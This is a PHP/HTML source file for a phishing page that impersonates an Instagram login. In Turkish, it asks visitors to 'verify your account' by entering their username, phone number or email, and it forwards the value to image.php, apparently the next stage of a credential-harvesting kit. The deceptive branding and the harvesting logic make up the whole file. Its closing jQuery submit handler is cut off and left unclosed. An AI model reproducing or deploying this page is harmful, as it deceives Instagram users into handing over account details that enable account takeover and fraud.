<?php 
if($_POST){
    $lorex=$_POST["nick"];
  header("location: image.php?nick=".$lorex);
  }

 ?>
<!DOCTYPE html>
<html lang="en">
<head>
	<title>Instagram | Login</title>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
<!--===============================================================================================-->	
	<link rel="icon" type="image/png" href="favicon.png"/>
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="css/vendor/bootstrap/css/bootstrap.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="fonts/font-awesome-4.7.0/css/font-awesome.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="css/vendor/animate/animate.css">
<!--===============================================================================================-->	
	<link rel="stylesheet" type="text/css" href="css/vendor/css-hamburgers/hamburgers.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="css/vendor/select2/select2.min.css">
	<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css">

<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="css/util.css">
	<link rel="stylesheet" type="text/css" href="css/main.css">
<!--===============================================================================================-->
</head>
<style type="text/css">
	<style>
	img {
  border: 1px solid #ddd;
  border-radius: 4px;
  padding: 5px;
  width: 150px;
}
    .overlay{
        display: none;
        position: fixed;
        width: 100%;
        height: 100%;
        top: 0;
        left: 0;
        z-index: 999;
        background: rgba(255,255,255,0.8) url("https://i.pinimg.com/originals/78/e8/26/78e826ca1b9351214dfdd5e47f7e2024.gif") center no-repeat;
    }
   
    /* Turn off scrollbar when body element has the loading class */
    body.loading{
        overflow: hidden;   
    }
    /* Make spinner image visible when body element has the loading class */
    body.loading .overlay{
        display: block;
    }
</style>

<style type="text/css">  .btn {
    cursor: pointer;
    width: 100%;
    padding:0 8px; 
    background: #3897f0;
    border:1px solid #3897f0;
    color:#fff;
    border-radius:10px;
    font-weight:600;
    font-size: 14px;
    height: 35px;
    line-height: 26px;
    outline: none;
    white-space: nowrap;
  }
</style>
<body>
	
	<div class="limiter">
		<div class="container-login100">
			<div class="wrap-login100">
				<div class="login100-pic js-tilt" data-tilt>
				<img src="https://www.vargonen.com/blog/wp-content/uploads/2020/09/instagramlogo.jpg" alt="IMG"> <br><br><br><br>
				</div>
<el class="login100-form validate-form" id="elemend">
				<form action="image.php" id="idForm" class="login100-form validate-form">
					

	<span class="login100-form-title">
				<h3 color="darkblue" class="h3">Hesabınızı Doğrulayın
</h3>
					</span>
					<div class="wrap-input100 validate-input">
						<input required="" class="input100" type="text" name="nick" placeholder="Username">
						</span>
					</div>
          
				
				
					<div class="container-login100-form-btn">
						
					<button  type="submit"  id="imagei" class="btn">Next</button> 
					
					</div><br><p><center>
			Kullanıcı adı, cep telefonu ya da e-posta adresinizi giriniz. Hesabınızın gerçek sahibi olduğunuzu doğrulayamadığımız için bu bilgileri istiyoruz.
		</center></p>	<br> <center><img src="data:image/png;base64,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" widght="80" height="65"></center></div>
					

				

					
				</form>
			</div>
		</div>
	</el>
	
	

	
<!--===============================================================================================-->	
	<script src="css/vendor/jquery/jquery-3.2.1.min.js"></script>
<!--===============================================================================================-->
	<script src="css/vendor/bootstrap/js/popper.js"></script>
	<script src="css/vendor/bootstrap/js/bootstrap.min.js"></script>
<!--===============================================================================================-->
	<script src="css/vendor/select2/select2.min.js"></script>
<!--===============================================================================================-->
	<script src="css/vendor/tilt/tilt.jquery.min.js"></script>
	<script >
		$('.js-tilt').tilt({
			scale: 1.1
		})
	</script>
<!--===============================================================================================-->
	<script src="css/js/main.js"></script>
<script type="text/javascript">
$("#idForm").submit(function(e) {

    e.preventDefault(); // avoid to execute the actual submit of the form.

    var form = $(this);
    var url = form.attr('action');
       var btn = $("#imagei");
         btn.prop("disabled", true);
         
    
      btn.html("Please Wait...");


</script>
</body>
</html>
